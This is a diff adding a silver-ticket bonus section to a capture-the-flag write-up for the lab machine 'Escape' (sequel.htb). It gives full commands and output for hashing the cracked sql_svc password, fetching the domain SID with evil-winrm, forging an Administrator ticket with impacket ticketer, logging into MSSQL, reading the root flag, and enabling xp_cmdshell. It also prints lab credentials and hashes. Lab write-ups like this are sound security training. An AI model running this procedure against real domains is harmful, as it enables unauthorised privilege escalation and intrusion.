@@ -339,3 +339,121 @@ evil-winrm -i $IP -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee
 ```
 
 `faketime` save the day!
+
+# Bonus with Silver Ticket
+The way that this machine is set up allows for another interesting solution. More specifically, this alternative
+approach requires us to have at least reached the point that we have the clear text password for the user
+sql_svc . This step is extremely important since this is a user account that runs the MSSQL service meaning
+that tickets to access this service will be encrypted with the password of the sql_svc user.
+
+* https://www.netwrix.com/silver_ticket_attack_forged_service_tickets.html
+
+Following the logic of a Silver Ticket attack we could be able to forge a ticket in behalf of the user
+Administrator to access the MSSQL service. Unfortunately, there is no Service Principal Name (SPN) set
+for this service instance so Kerberos isn't able to produce a valid Service Ticket for us that we could then try
+and alter.
+
+In this case, we can use ticketer from impacket. This script, has the benefit that the ticket creation is done
+locally, meaning that there is no need to contact Kerberos on the remote machine and ask for a Service
+Ticket. Moreover, we have to keep in mind that the service is responsible for validating presented tickets
+and not Kerberos. So, even if Kerberos is unaware that MSSQL is running under sql_svc if we manage to
+craft a valid ticket locally for the Administrator user we should be able to access the service as this user.
+
+### NTLM hash generator
+```bash
+Python 3.11.6 (main, Oct  8 2023, 05:06:43) [GCC 13.2.0] on linux
+
+>>> import hashlib
+>>> hashlib.new('md4', 'REGGIE1234ronnie'.encode('utf-16le')).digest()
+b'\x14C\xec\x19\xdaM\xacO\xfc\x95;\xca\x1bW\xb4\xcf'
+>>> hashlib.new('md4', 'REGGIE1234ronnie'.encode('utf-16le')).digest().hex()
+'1443ec19da4dac4ffc953bca1b57b4cf'
+```
+
+* https://codebeautify.org/ntlm-hash-generator
+
+### Domain SID
+```cmd
+evil-winrm -i $IP -u sql_svc -p REGGIE1234ronnie
+*Evil-WinRM* PS C:\Users\sql_svc\Documents> Get-ADDomain | fl DomainSID
+
+DomainSID : S-1-5-21-4078382237-1492182817-2568127209
+```
+
+### Generate
+The `spn` parameter is needed to produce a valid ticket but we can place anything we want since it's not set
+to begin with.
+
+```bash
+/usr/share/doc/python3-impacket/examples/ticketer.py -nthash 1443ec19da4dac4ffc953bca1b57b4cf -domain-sid S-1-5-21-4078382237-1492182817-2568127209 -domain sequel.htb -spn doesnotmatter/dc.sequel.htb administrator
+
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for sequel.htb/administrator
+[*]     PAC_LOGON_INFO
+[*]     PAC_CLIENT_INFO_TYPE
+[*]     EncTicketPart
+[*]     EncTGSRepPart
+[*] Signing/Encrypting final ticket
+[*]     PAC_SERVER_CHECKSUM
+[*]     PAC_PRIVSVR_CHECKSUM
+[*]     EncTicketPart
+[*]     EncTGSRepPart
+[*] Saving ticket in administrator.ccache
+
+export KRB5CCNAME=administrator.ccache
+impacket-mssqlclient -k dc.sequel.htb
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Encryption required, switching to TLS
+[-] ERROR(DC\SQLMOCK): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
+sudo ntpdate -u sequel.htb
+[sudo] password for alvin: 
+2023-11-18 00:25:50.129929 (+1300) +28799.890695 +/- 0.068800 sequel.htb 10.10.11.202 s1 no-leap
+CLOCK: time stepped by 28799.890695
+faketime '2023-11-18 00:26:00' impacket-mssqlclient -k dc.sequel.htb
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
+[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+[!] Press help for extra shell commands
+SQL (sequel\Administrator  dbo@master)>
+```
+
+### Read flags
+```bash
+SQL (sequel\Administrator  dbo@master)>  SELECT * FROM OPENROWSET(BULK N'C:\users\administrator\desktop\root.txt', SINGLE_CLOB) AS Contents
+BulkColumn                                
+---------------------------------------   
+b'4316530eeff3ed7c70aa631cbbc3dff7\r\n'
+```
+
+### RCE
+```bash
+SQL (sequel\Administrator  dbo@master)> enable_xp_cmdshell
+[*] INFO(DC\SQLMOCK): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
+[*] INFO(DC\SQLMOCK): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
+SQL (sequel\Administrator  dbo@master)> sp_configure 'xp_cmdshell', '1'
+[*] INFO(DC\SQLMOCK): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
+SQL (sequel\Administrator  dbo@master)> RECONFIGURE
+SQL (sequel\Administrator  dbo@master)> enable_xp_cmdshell
+[*] INFO(DC\SQLMOCK): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
+[*] INFO(DC\SQLMOCK): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
+SQL (sequel\Administrator  dbo@master)> xp_cmdshell whoami
+output           
+--------------   
+sequel\sql_svc   
+
+NULL             
+```
+
+The commands are still running as sql_svc. That’s because sql_svc is still the process running the MSSQL service. It is just able to negotiate with the OS to read file as administrator because it has that ticket.
+
+* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---privileged-file-write
+* https://0xdf.gitlab.io/2023/06/17/htb-escape.html#silver-ticket
